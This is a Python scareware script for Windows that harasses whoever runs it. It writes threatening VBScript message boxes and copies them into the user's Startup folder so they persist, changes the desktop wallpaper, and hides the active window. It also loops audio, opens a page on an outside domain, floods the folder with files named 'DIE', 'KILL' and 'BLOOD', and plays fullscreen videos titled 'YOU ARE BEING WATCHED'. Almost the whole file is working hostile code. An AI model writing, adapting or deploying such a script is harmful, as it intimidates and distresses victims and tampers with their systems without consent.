import os
import shutil
import ctypes
import threading
import win32api
import playsound
import win32gui, win32con
from threading import Thread
import time
from cryptography.fernet import Fernet
from gtts import gTTS
import cv2
import getpass

class GetCurrentPath:
    current_path = os.getcwd()

class AddToStartup:
    BOX = ['x=msgbox("YOU ARE STILL MINE" ,48, "NO RUN AWAY..")','x=msgbox("I WILL EAT YOU ALIVE" ,2, "WHILE YOU SLEEP")']
    tocopy = ["sysinfo.vbs","system32.vbs"]
    with open(file=tocopy[0],mode="a") as msgbox2:
        msgbox2.write(BOX[0])
        msgbox2.close()
    with open(file=tocopy[1],mode="a") as msgbox2:
        msgbox2.write(BOX[1])
        msgbox2.close()
    USER_NAME = getpass.getuser()
    file_path = (r"C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" % USER_NAME)
    shutil.copy2(tocopy[0],file_path)
    shutil.copy2(tocopy[1],file_path)

class ChangeBackground:
    ctypes.windll.user32.SystemParametersInfoW(20, 0, f"{GetCurrentPath.current_path}/bgphoto.jpg" , 0)

class PlayMusic:
    kill = False
    MusicLoop = True
    def musicloop():
        the_program_to_hide = win32gui.GetForegroundWindow()
        win32gui.ShowWindow(the_program_to_hide , win32con.SW_HIDE)
        while PlayMusic.MusicLoop:
            playsound.playsound(f"{GetCurrentPath.current_path}/bgmusic.mp3")

threading.Thread(target=PlayMusic.musicloop).start()

class WebPageOpen:
    os.system("START http://973-eht-namuh-973.com/coloured%20site/start/i_thought/1.htm")


class MarryMe:
    INFILETEXT = "DO NOT LOOK BEHIND YOU ;)"
    item_names = ["MARRYME","ISEEYOU","SCARY","EYE","BLOOD","KILL","DEATH","ESCAPE","OVER","FIRE","BURNTODEATH","ONECUP","DIE","ONEHAMMER","ONEGUY","BOY","CREEP","NOWAYTORUN","RUN","BEHINDYOU","I AM BEHIND YOU","I AM WATCHING YOU"," THERE IS NO WAY TO RUN","DO NOT RUN AWAY","YOUR SOUL IS MINE"]
    for item in item_names:
        with open(file=f"{item}.BAS",mode="a") as create:
            create.write(f"{INFILETEXT}")
            create.close()
    time.sleep(10)
    ENJOYTEXT = "PLEASE MARRY ME. I WANT TO FEEL YOU. I WANT TO TASTE YOU.\nhttps://memegenerator.net/img/instances/25169849/watch-out-someones-behind-you.jpg"
    with open(file="ENJOY.txt", mode="a") as openme:
        openme.write(ENJOYTEXT)
        openme.close()
    os.system(f"START {GetCurrentPath.current_path}/ENJOY.txt")
    time.sleep(12)
    os.system("START https://www.google.com/search?q=creepypasta+photos&tbm=isch&ved=2ahUKEwiHzoSumqr0AhXn2rsIHdj_DlEQ2-cCegQIABAA&oq=creepypasta+photos&gs_lcp=CgNpbWcQAzIECAAQEzIECAAQEzIICAAQBRAeEBMyCAgAEAUQHhATOgcIIxDvAxAnOgUIABCABDoECAAQQzoICAAQCBAeEBM6BggAEB4QE1DSBFjsCmD5C2gAcAB4AIABnQGIAakGkgEDNS4zmAEAoAEBqgELZ3dzLXdpei1pbWfAAQE&sclient=img&ei=H6CaYcdC57Xv9Q_Y_7uIBQ&bih=722&biw=1536")

class Sounds:
    time.sleep(5)
    message = "Do not look behind you."
    language = "en"

    obj=gTTS(text=message,lang=language,slow=True)
    obj.save(f"{GetCurrentPath.current_path}/run.mp3")
    os.system(f"START {GetCurrentPath.current_path}/run.mp3")

class PlayVideo:
    time.sleep(10)
    file_name = f"{GetCurrentPath.current_path}/dinnertrim.mp4"
    window_name = "YOU ARE BEING WATCHED"
    interframe_wait_ms = 30

    cap = cv2.VideoCapture(file_name)
    if not cap.isOpened():
        print("Error: Could not open video.")
        exit()

    cv2.namedWindow(window_name, cv2.WND_PROP_FULLSCREEN)
    cv2.setWindowProperty(window_name, cv2.WND_PROP_FULLSCREEN, cv2.WINDOW_FULLSCREEN)

    while (True):
        ret, frame = cap.read()
        if not ret:
            print("Reached end of video, exiting.")
            break

        cv2.imshow(window_name, frame)
        if cv2.waitKey(interframe_wait_ms) & 0x7F == ord('q'):
            print("Exit requested.")
            break

    cap.release()
    cv2.destroyAllWindows()

class MessageBox:
    MSGBOX_WARNING = ['x=msgbox("SOMEONE IS WATCHING YOU" ,48, "DONT LOOK BEHIND YOU")','x=msgbox("I AM HAVING FUN.." ,16, "HA HA HA")']
    with open(file="msgbox.vbs",mode="a") as msgbox:
        msgbox.write(MSGBOX_WARNING[0])
        msgbox.close()
    with open(file="msgbox2.vbs",mode="a") as msgbox2:
        msgbox2.write(MSGBOX_WARNING[1])
        msgbox2.close()
    os.system(f"START {GetCurrentPath.current_path}/msgbox.vbs")
    time.sleep(3)
    os.system(f"START {GetCurrentPath.current_path}/msgbox2.vbs")

class ChangeWallpaper2:
    time.sleep(3)
    ctypes.windll.user32.SystemParametersInfoW(20, 0, f"{GetCurrentPath.current_path}/you.jpg" , 0)

class Animation:
    Twinkle = True
    player = os.system(f"START {GetCurrentPath.current_path}/twinkleaudio.mp3")

class AnimateVideo:
    file_name = f"{GetCurrentPath.current_path}/NotepadNew.mp4"
    window_name = "YOU ARE BEING WATCHED"
    interframe_wait_ms = 30

    cap = cv2.VideoCapture(file_name)
    if not cap.isOpened():
        print("Error: Could not open video.")
        exit()

    cv2.namedWindow(window_name, cv2.WND_PROP_FULLSCREEN)
    cv2.setWindowProperty(window_name, cv2.WND_PROP_FULLSCREEN, cv2.WINDOW_FULLSCREEN)

    while (True):
        ret, frame = cap.read()
        if not ret:
            print("Reached end of video, exiting.")
            break

        cv2.imshow(window_name, frame)
        if cv2.waitKey(interframe_wait_ms) & 0x7F == ord('q'):
            print("Exit requested.")
            break

    cap.release()
    cv2.destroyAllWindows()


    

    